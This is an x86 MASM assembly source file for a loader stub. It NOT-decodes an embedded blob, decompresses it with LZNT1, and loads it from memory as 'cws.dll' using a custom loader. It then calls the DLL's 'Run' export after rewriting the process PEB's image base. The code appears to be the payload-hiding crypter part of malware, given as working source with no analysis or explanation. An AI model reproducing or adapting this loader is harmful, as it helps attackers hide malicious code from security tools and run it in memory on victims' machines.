	.686
	.model flat, stdcall
	option casemap :none
	
	include \masm32\include\ntdll.inc
	includelib \masm32\lib\ntdll.lib
.data
	include Crypt.inc
.code
	include Ldr.inc

NTERR macro
	.if Eax
	Int 3
	.endif
endm

$Dll		CHAR "cws.dll",0
$Run		CHAR "Run",0

	assume fs:nothing
Entry proc
Local ImageBase:PVOID, Startup:PVOID
Local MapAddress:PVOID, MapSize:ULONG
Local FinalUncompressedSize:ULONG
	mov MapAddress,0
	mov MapSize,19C00H
	invoke ZwAllocateVirtualMemory, NtCurrentProcess, addr MapAddress, 0, addr MapSize, MEM_COMMIT, PAGE_READWRITE
	NTERR
; Encrypt
	mov ecx,604FH/4 + 1
@@:
	not dword ptr [offset gMap + ecx*4 - 4]
	loop @b
; Unpack
	invoke RtlDecompressBuffer, COMPRESSION_FORMAT_LZNT1, MapAddress, 19C00H, addr gMap, 604FH, addr FinalUncompressedSize
	NTERR
	lea eax,ImageBase
	push eax
	push 0
	push offset $Dll
	push MapAddress
	xor eax,eax	; #LDR_LOAD_DLL
	Call LDR
	NTERR
	invoke ZwFreeVirtualMemory, NtCurrentProcess, addr MapAddress, addr MapSize, MEM_RELEASE
	lea ecx,Startup
	xor eax,eax
	push ecx
	push eax
	push eax
	push offset $Run
	push ImageBase
	inc eax	; #LDR_QUERY_ENTRY
	Call LDR
	NTERR
; Fix base.
	mov eax,fs:[TEB.Peb]
	mov ecx,ImageBase
	push PEB.ImageBaseAddress[eax]
	mov PEB.ImageBaseAddress[eax],ecx
	Call Startup
;	mov eax,fs:[TEB.Peb]
;	pop PEB.ImageBaseAddress[eax]
	ret
Entry endp
end Entry